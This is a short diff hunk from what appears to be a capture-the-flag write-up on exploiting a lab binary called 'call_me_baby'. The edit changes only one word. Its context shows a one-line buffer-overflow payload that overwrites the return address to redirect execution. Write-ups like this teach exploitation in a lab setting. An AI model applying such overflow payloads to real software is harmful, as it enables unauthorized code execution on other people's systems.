@@ -426,7 +426,7 @@ Error in re-setting breakpoint 2: No symbol "call_me" in current context.
 [Inferior 1 (process 6977) exited normally]
 ```
 
-Gdb is trying to start a new process. Let's try our payload on the binary :
+Gdb is trying to start a new process. Let's test our payload on the binary :
 
 ```bash
 $ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*72+b"\xb0\x11\x40\x00"+b"\x00"*4)' ; tee) | ./call_me_baby 
